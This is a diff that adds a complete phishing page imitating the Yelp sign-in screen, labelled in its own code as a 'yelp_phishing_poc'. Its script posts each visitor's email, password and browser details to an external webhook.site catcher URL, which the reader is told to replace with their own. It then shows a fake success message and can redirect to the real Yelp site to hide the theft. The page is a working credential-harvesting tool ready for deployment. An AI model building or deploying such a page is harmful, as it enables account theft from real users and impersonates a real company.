@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Yelp</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f7f7f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.5;
+            color: #333;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            padding: 40px 35px;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .yelp-logo {
+            height: 60px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .page-title {
+            font-size: 26px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 8px;
+            color: #000;
+        }
+
+        .page-subtitle {
+            text-align: center;
+            color: #666;
+            font-size: 15px;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 22px;
+        }
+
+        label {
+            display: block;
+            font-weight: 500;
+            font-size: 15px;
+            margin-bottom: 8px;
+            color: #333;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 15px 16px;
+            font-size: 16px;
+            border: 1.5px solid #ddd;
+            border-radius: 8px;
+            background-color: #fafafa;
+            transition: all 0.2s ease;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #d32323;
+            background-color: #fff;
+            box-shadow: 0 0 0 3px rgba(211, 35, 35, 0.15);
+        }
+
+        .input-field::placeholder {
+            color: #999;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: right;
+            margin-top: 8px;
+        }
+
+        .forgot-link a {
+            color: #0073bb;
+            font-size: 14.5px;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 17px;
+            background-color: #d32323;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s, transform 0.1s;
+        }
+
+        .submit-btn:hover {
+            background-color: #b51e1e;
+            transform: translateY(-1px);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .footer {
+            margin-top: 35px;
+            padding-top: 25px;
+            border-top: 1px solid #eee;
+            text-align: center;
+            font-size: 14.5px;
+            color: #666;
+        }
+
+        .signup-link {
+            margin-bottom: 15px;
+        }
+
+        .signup-link a {
+            color: #0073bb;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        .legal-text {
+            font-size: 13px;
+            color: #888;
+            line-height: 1.5;
+        }
+
+        .legal-text a {
+            color: #666;
+            text-decoration: underline;
+        }
+
+        #errorMessage {
+            color: #d32323;
+            background-color: #ffefef;
+            padding: 14px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            text-align: center;
+            border: 1px solid #ffcccc;
+            font-size: 15px;
+            display: none;
+        }
+
+        .loading {
+            opacity: 0.8;
+            cursor: not-allowed !important;
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 30px 25px;
+            }
+            .yelp-logo {
+                height: 50px;
+            }
+            .page-title {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Yelp Logo (SVG in Base64) -->
+        <div class="logo-container">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTA1IiBoZWlnaHQ9IjYwIiB2aWV3Qm94PSIwIDAgMTA1IDYwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMjIuNjgxOCA0NS4zMjQ4SDEwLjk5OThWMTQuNDg0OEgyMi42ODE4QzMyLjMzNTggMTQuNDg0OCAzNy45MDE4IDE5LjM5MDggMzcuOTAxOCAyOS44NjA4QzM3LjkwMTggNDAuMzMwOCAzMi4zMzU4IDQ1LjMyNDggMjIuNjgxOCA0NS4zMjQ4Wk0yMi42ODE4IDIxLjMxMjhIMTguNjUxOFYzOC40OTY4SDIyLjY4MThDMjguMTI1OCAzOC40OTY4IDMwLjg0MzggMzUuMTMyOCAzMC44NDM4IDI5Ljg2MDhDMzAuODQzOCAyNC41ODg4IDI4LjEyNTggMjEuMzEyOCAyMi42ODE4IDIxLjMxMjhaIiBmaWxsPSIjRDMyMzIzIi8+CjxwYXRoIGQ9Ik00OC43MDE4IDQ1LjMyNDhIMzcuMDE5OFYxNC40ODQ4SDQ4LjcwMThDNTguMzU1OCAxNC40ODQ4IDYzLjkyMTggMTkuMzkwOCA2My45MjE4IDI5Ljg2MDhDNjMuOTIxOCA0MC4zMzA4IDU4LjM1NTggNDUuMzI0OCA0OC43MDE4IDQ1LjMyNDhaTTQ4LjcwMTggMjEuMzEyOEg0NC42NzE4VjM4LjQ5NjhINDguNzAxOEM1NC4xNDU4IDM4LjQ5NjggNTYuODYzOCAzNS4xMzI4IDU2Ljg2MzggMjkuODYwOEM1Ni44NjM4IDI0LjU4ODggNTQuMTQ1OCAyMS4zMTI4IDQ4LjcwMTggMjEuMzEyWiIgZmlsbD0iI0QzMjMyMyIvPgo8cGF0aCBkPSJNNzQuNzIxOCA0NS4zMjQ4SDYzLjAzOThWMTQuNDg0OEg3NC43MjE4Qzg0LjM3NTggMTQuNDg0OCA4OS45NDE4IDE5LjM5MDggODkuOTQxOCAyOS44NjA4Qzg5Ljk0MTggNDAuMzMwOCA4NC4zNzU4IDQ1LjMyNDggNzQuNzIxOCA0NS4zMjQ4Wk03NC43MjE4IDIxLjMxMjhINzAuNjkxOFYzOC40OTY4SDc0LjcyMThDODAuMTY1OCAzOC40OTY4IDgyLjg4MzggMzUuMTMyOCA4Mi44ODM4IDI5Ljg2MDhDODIuODgzOCAyNC41ODg4IDgwLjE2NTggMjEuMzEyOCA3NC43MjE4IDIxLjMxMjhaIiBmaWxsPSIjRDMyMzIzIi8+CjxwYXRoIGQ9Ik0xMC45OTk4IDQ1LjMyNDhIMC4xMTk4MDhWMTQuNDg0OEgxMC45OTk4VjIxLjMxMjhINS41OTk4MFYzOC40OTY4SDEwLjk5OThWNDUuMzI0OFoiIGZpbGw9IiMwMDAwMDAiLz4KPHBhdGggZD0iTTM3LjAxOTggNDUuMzI0OEgyNi4xMzk4VjE0LjQ4NDhIMzcuMDE5OFYyMS4zMTI4SDMxLjYxOThWMzguNDk2OEgzNy4wMTk4VjQ1LjMyNDhaIiBmaWxsPSIjMDAwMDAwIi8+CjxwYXRoIGQ9Ik02My4wMzk4IDQ1LjMyNDhINTIuMTU5OFYxNC40ODQ4SDYzLjAzOThWMjEuMzEyOEg1Ny42Mzk4VjM4LjQ5NjhINjMuMDM5OFY0NS4zMjQ4WiIgZmlsbD0iIzAwMDAwMCIvPgo8cGF0aCBkPSJNMTA0LjU5OCA0NS4zMjQ4SDkzLjcxOFYxNC40ODQ4SDEwNC41OThWMjEuMzEyOEg5OS4xOThWMzguNDk2OEgxMDQuNTk4VjQ1LjMyNDhaIiBmaWxsPSIjMDAwMDAwIi8+Cjwvc3ZnPgo=" alt="Yelp Logo" class="yelp-logo">
+        </div>
+
+        <h1 class="page-title">Sign in to your account</h1>
+        <p class="page-subtitle">Enter your email and password to continue</p>
+
+        <div id="errorMessage">
+            <strong>Something went wrong.</strong> Please check your credentials and try again.
+        </div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="emailInput">Email address</label>
+                <input type="email" id="emailInput" class="input-field" placeholder="you@example.com" required autocomplete="email">
+            </div>
+
+            <div class="form-group">
+                <label for="passwordInput">Password</label>
+                <input type="password" id="passwordInput" class="input-field" placeholder="Enter your password" required autocomplete="current-password">
+                <div class="forgot-link">
+                    <a href="#">Forgot your password?</a>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitButton">
+                <span id="buttonText">Sign In</span>
+                <span id="buttonSpinner" style="display:none;">Signing in...</span>
+            </button>
+        </form>
+
+        <div class="footer">
+            <div class="signup-link">
+                Don't have an account? <a href="#">Sign up for Yelp</a>
+            </div>
+            <p class="legal-text">
+                By continuing, you agree to Yelp's
+                <a href="#">Terms of Service</a> and acknowledge Yelp's
+                <a href="#">Privacy Policy</a>.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // CONFIGURE THIS: Replace with your actual webhook.site catcher URL
+        const YOUR_WEBHOOK_URL = 'https://webhook.site/geeky';
+
+        const loginForm = document.getElementById('loginForm');
+        const errorMessage = document.getElementById('errorMessage');
+        const submitButton = document.getElementById('submitButton');
+        const buttonText = document.getElementById('buttonText');
+        const buttonSpinner = document.getElementById('buttonSpinner');
+
+        loginForm.addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('emailInput').value.trim();
+            const password = document.getElementById('passwordInput').value;
+
+            // Basic validation
+            if (!email || !password) {
+                showError('Please enter both email and password.');
+                return;
+            }
+
+            // Show loading state
+            setLoadingState(true);
+
+            // Hide previous errors
+            errorMessage.style.display = 'none';
+
+            try {
+                // Send data to your webhook using form-urlencoded
+                const response = await fetch(YOUR_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&timestamp=${encodeURIComponent(new Date().toISOString())}&source=yelp_phishing_poc&userAgent=${encodeURIComponent(navigator.userAgent)}`
+                });
+
+                console.log('Data sent to webhook:', { email, password });
+
+                // Simulate a successful login for the user
+                setTimeout(() => {
+                    alert('✓ Sign in successful! Redirecting to Yelp...');
+                    setLoadingState(false);
+                    // Optionally redirect to the real Yelp site
+                    // window.location.href = 'https://www.yelp.com';
+                }, 800);
+
+            } catch (error) {
+                console.error('Error sending data:', error);
+                showError('A network error occurred. Please check your connection.');
+                setLoadingState(false);
+            }
+        });
+
+        function showError(message) {
+            errorMessage.innerHTML = `<strong>Error</strong><br>${message}`;
+            errorMessage.style.display = 'block';
+        }
+
+        function setLoadingState(isLoading) {
+            if (isLoading) {
+                submitButton.disabled = true;
+                submitButton.classList.add('loading');
+                buttonText.style.display = 'none';
+                buttonSpinner.style.display = 'inline';
+            } else {
+                submitButton.disabled = false;
+                submitButton.classList.remove('loading');
+                buttonText.style.display = 'inline';
+                buttonSpinner.style.display = 'none';
+            }
+        }
+
+        // Optional: Clear error when user starts typing again
+        document.querySelectorAll('.input-field').forEach(input => {
+            input.addEventListener('input', () => {
+                errorMessage.style.display = 'none';
+            });
+        });
+    </script>
+</body>
+</html>
